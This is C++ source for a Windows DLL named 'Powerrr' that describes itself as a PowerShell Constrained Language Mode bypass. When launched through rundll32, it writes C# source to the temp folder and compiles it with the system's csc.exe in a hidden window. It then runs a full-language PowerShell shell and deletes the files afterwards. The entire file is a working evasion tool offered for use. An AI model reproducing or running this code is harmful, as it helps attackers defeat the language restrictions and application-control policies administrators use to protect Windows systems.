#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <string>

// -------------------------------------------------------
// Powerrr - CLM bypass via runtime C# compilation
// No metahost.h needed - uses csc.exe on target
// Run: rundll32.exe powerrr.dll,Start
// -------------------------------------------------------

std::string FindSMA()
{
    char wdir[MAX_PATH];
    GetWindowsDirectoryA(wdir, MAX_PATH);

    std::string roots[] = {
        std::string(wdir) + "\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation",
        std::string(wdir) + "\\Microsoft.NET\\assembly\\GAC_64\\System.Management.Automation"
    };

    for (auto& root : roots) {
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA((root + "\\*").c_str(), &fd);
        if (h != INVALID_HANDLE_VALUE) {
            do {
                if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && fd.cFileName[0] != '.') {
                    std::string full = root + "\\" + fd.cFileName + "\\System.Management.Automation.dll";
                    if (GetFileAttributesA(full.c_str()) != INVALID_FILE_ATTRIBUTES) {
                        FindClose(h);
                        return full;
                    }
                }
            } while (FindNextFileA(h, &fd));
            FindClose(h);
        }
    }
    return "";
}

std::string FindCompiler()
{
    std::string locs[] = {
        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe"
    };
    for (auto& l : locs) {
        if (GetFileAttributesA(l.c_str()) != INVALID_FILE_ATTRIBUTES)
            return l;
    }
    return "";
}

void LaunchShell()
{
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string src = std::string(tmp) + "runtime_host.cs";
    std::string bin = std::string(tmp) + "runtime_host.exe";

    printf("[*] Preparing...\n");

    FILE* f = fopen(src.c_str(), "w");
    if (!f) { printf("[-] Write failed\n"); return; }

    fprintf(f,
        "using System;\n"
        "using System.IO;\n"
        "using System.Text;\n"
        "using System.Collections.ObjectModel;\n"
        "using System.Management.Automation;\n"
        "using System.Management.Automation.Runspaces;\n"
        "public class RuntimeHost {\n"
        "    public static void Main() {\n"
        "        try {\n"
        "            var sessionState = InitialSessionState.Create();\n"
        "            sessionState.LanguageMode = PSLanguageMode.FullLanguage;\n"
        "            var runspace = RunspaceFactory.CreateRunspace(sessionState);\n"
        "            runspace.Open();\n"
        "            Console.WriteLine(\"[+] Powerrr ready\");\n"
        "            using (var pwsh = PowerShell.Create()) {\n"
        "                pwsh.Runspace = runspace;\n"
        "                pwsh.AddScript(\"$ExecutionContext.SessionState.LanguageMode\");\n"
        "                var lr = pwsh.Invoke();\n"
        "                if (lr.Count > 0) Console.WriteLine(\"[*] \" + lr[0].ToString());\n"
        "            }\n"
        "            string inputCmd;\n"
        "            while (true) {\n"
        "                Console.Write(\"PS \" + Directory.GetCurrentDirectory() + \"> \");\n"
        "                inputCmd = Console.ReadLine();\n"
        "                if (inputCmd == null) continue;\n"
        "                if (inputCmd.Trim().ToLower() == \"exit\") break;\n"
        "                if (inputCmd.Trim().Length == 0) continue;\n"
        "                try {\n"
        "                    var pipeline = runspace.CreatePipeline();\n"
        "                    pipeline.Commands.AddScript(inputCmd);\n"
        "                    pipeline.Commands.Add(\"Out-String\");\n"
        "                    var results = pipeline.Invoke();\n"
        "                    var sb = new StringBuilder();\n"
        "                    foreach (var obj in results) sb.Append(obj);\n"
        "                    string outStr = sb.ToString().Trim();\n"
        "                    if (outStr.Length > 0) Console.WriteLine(outStr);\n"
        "                } catch (Exception cmdEx) {\n"
        "                    Console.WriteLine(\"[!] \" + cmdEx.Message);\n"
        "                }\n"
        "            }\n"
        "            runspace.Close();\n"
        "        } catch (Exception ex) {\n"
        "            Console.WriteLine(\"[-] \" + ex.Message);\n"
        "            Console.ReadKey();\n"
        "        }\n"
        "    }\n"
        "}\n"
    );
    fclose(f);

    std::string compiler = FindCompiler();
    if (compiler.empty()) { printf("[-] csc.exe not found\n"); DeleteFileA(src.c_str()); return; }
    printf("[+] Compiler found\n");

    std::string sma = FindSMA();

    char compileCmd[MAX_PATH * 6];
    if (!sma.empty()) {
        sprintf(compileCmd, "\"%s\" /nologo /target:exe /out:\"%s\" /reference:\"%s\" \"%s\"",
            compiler.c_str(), bin.c_str(), sma.c_str(), src.c_str());
    } else {
        sprintf(compileCmd, "\"%s\" /nologo /target:exe /out:\"%s\" \"%s\"",
            compiler.c_str(), bin.c_str(), src.c_str());
    }

    printf("[*] Compiling...\n");

    STARTUPINFOA si1; PROCESS_INFORMATION pi1;
    ZeroMemory(&si1, sizeof(si1)); ZeroMemory(&pi1, sizeof(pi1));
    si1.cb = sizeof(si1); si1.dwFlags = STARTF_USESHOWWINDOW; si1.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, compileCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si1, &pi1)) {
        printf("[-] Compile launch failed: %d\n", GetLastError());
        DeleteFileA(src.c_str()); return;
    }

    WaitForSingleObject(pi1.hProcess, 20000);
    DWORD exitCode = 0;
    GetExitCodeProcess(pi1.hProcess, &exitCode);
    CloseHandle(pi1.hProcess); CloseHandle(pi1.hThread);

    if (exitCode != 0 || GetFileAttributesA(bin.c_str()) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] Compile failed (exit: %d)\n", exitCode);
        DeleteFileA(src.c_str()); return;
    }

    printf("[+] Compiled OK\n");
    printf("[*] Launching...\n");

    char runCmd[MAX_PATH + 4];
    sprintf(runCmd, "\"%s\"", bin.c_str());

    STARTUPINFOA si2; PROCESS_INFORMATION pi2;
    ZeroMemory(&si2, sizeof(si2)); ZeroMemory(&pi2, sizeof(pi2));
    si2.cb = sizeof(si2);

    if (CreateProcessA(NULL, runCmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi2)) {
        WaitForSingleObject(pi2.hProcess, INFINITE);
        CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread);
    } else {
        printf("[-] Launch failed: %d\n", GetLastError());
    }

    DeleteFileA(src.c_str());
    DeleteFileA(bin.c_str());
}

DWORD WINAPI PowerrrThread(LPVOID param)
{
    LaunchShell();
    return 0;
}

extern "C" __declspec(dllexport)
void __stdcall Start(HWND hwnd, HINSTANCE hinst, LPSTR lp, int n)
{
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONIN$",  "r", stdin);
    printf("[*] Powerrr loading...\n");
    HANDLE hT = CreateThread(NULL, 0, PowerrrThread, NULL, 0, NULL);
    if (hT) { WaitForSingleObject(hT, INFINITE); CloseHandle(hT); }
    FreeConsole();
}

extern "C" __declspec(dllexport)
void __stdcall Run(HWND hwnd, HINSTANCE hinst, LPSTR lp, int n)
{
    Start(hwnd, hinst, lp, n);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    return TRUE;
}
